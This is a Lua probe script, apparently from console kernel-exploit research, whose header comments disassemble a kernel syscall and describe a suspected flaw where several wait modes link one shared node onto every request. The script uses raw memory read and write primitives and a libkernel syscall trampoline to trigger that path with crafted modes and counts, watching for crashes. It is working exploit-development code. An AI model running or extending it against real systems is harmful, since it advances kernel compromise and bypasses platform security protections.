-- CRASH_CLASS: HIGH
-- PROBE 1235b: 663's guard names the value 0. Its sibling path is mode 3.
--
-- Decoded from the 13.60 body (0x3b01f0 unpacker, 0x3b0210 body):
--   arg1 uap[0]  = ids        arg2 uap[8]  = count      arg3 uap[0x10] = status out
--   arg4 uap[0x18] = mode     arg5 uap[0x20] = POINTER to a 4-byte timeout
--     0x3b04f3 call 0x8ac19280 copies 4 bytes from that pointer into [rbx+0x108]
--   node array: 0x3b0576 imul rdi,count,0x38 ; call malloc   -> r14
--   status array: 0x3b0534 imul count,0x18 ; call malloc      -> r12   (only if tunable 0x8b4c78d0 != 0)
--   0x3b05bc mov [rbx+0x40], r14      <-- FIXED pointer to node[0]
--   loop 0x3b05db: inc r15 ; add r14,0x38 ; add r8,0x18
--   mode dispatch 0x3b078c: cmp eax,1 / jne 0x3b0839 ; cmp eax,2 / jne 0x3b08e5
--   mode 1 and 2 link r14 (the per-index node).  mode 0 AND 3..0xFF link rcx=[rbx+0x40]
--   -- the same node[0] onto every request, owner overwritten each pass.
-- 1219a/1221a measured EINVAL for mode 0 count>1 only. This probe asks whether 3 is refused.

print("=== PROBE 1235b: 663 mode 3 at count 2 ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function alive() local ok,v=pcall(function() return N(mk(20)()) end) if ok then return v end return -1 end

local lk = N(libkernel_base)
local TR = lk + 0x3B7
print(string.format("[0] pid=%d trampoline=0x%X", alive(), TR))

local ids = memory.alloc(64)
local out = memory.alloc(64)
local tmo = memory.alloc(8)
wd(tmo, 20)

local function pending(n)
    local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
    mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
    local fd0, fd1 = rd(sv), rd(sv+4)
    if fd0 <= 0 then return nil end
    local buf = memory.alloc(0x100)
    local ba = 0
    do local ok,v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
    local reqs = memory.alloc(0x28*n)
    for i=0,0x28*n-1,4 do wd(reqs+i,0) end
    for i=0,n-1 do
        local r = reqs + i*0x28
        wd(r+0x08,0x10)
        wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
        wd(r+0x20, fd0)
    end
    wd(ids,0) wd(ids+4,0) wd(ids+8,0)
    mk(669)(uint64(0x1001),uint64(reqs),uint64(n),uint64(3),uint64(ids))
    return fd0, fd1
end

local function run(label, mode, n, tv)
    print(label)
    local fd0, fd1 = pending(n)
    if not fd0 then print("    socketpair failed") return false end
    local id0, id1 = rd(ids), rd(ids+4)
    print(string.format("    fds %d %d ids 0x%08X 0x%08X", fd0, fd1, id0, id1))
    wd(ids, id0) wd(ids+4, id1)
    wd(tmo, tv)
    wd(out,0xAAAAAAAA) wd(out+4,0xAAAAAAAA) wd(out+8,0xAAAAAAAA)
    local ok, rv = pcall(function() return native.fcall_with_rax(TR, 663, ids, n, out, mode, tmo, 0) end)
    if not ok then print("    PCALL-FAIL") return false end
    local h,l = hilo(rv)
    print(string.format("    ret=0x%08X_%08X err=%s out=%08X %08X %08X", h, l, ES(), rd(out), rd(out+4), rd(out+8)))
    print(string.format("    pid after wait=%d", alive()))
    return true
end

run("[1] mode 0 n=1 timeout 20  (timing unit check)", 0, 1, 20)
run("[2] mode 3 n=1 timeout 20  (is mode 3 accepted at all)", 3, 1, 20)
run("[3] mode 0 n=2 timeout 20  (guard control)", 0, 2, 20)
run("[4] mode 3 n=2 timeout 20  (THE TEST)", 3, 2, 20)
print(string.format("[4b] pid=%d", alive()))
run("[5] mode 4 n=2", 4, 2, 20)
run("[6] mode 5 n=2", 5, 2, 20)
run("[7] mode 0x10 n=2", 0x10, 2, 20)
run("[8] mode 0xFF n=2", 0xFF, 2, 20)
print(string.format("[Z] pid_end=%d", alive()))
print("=== DONE ===")
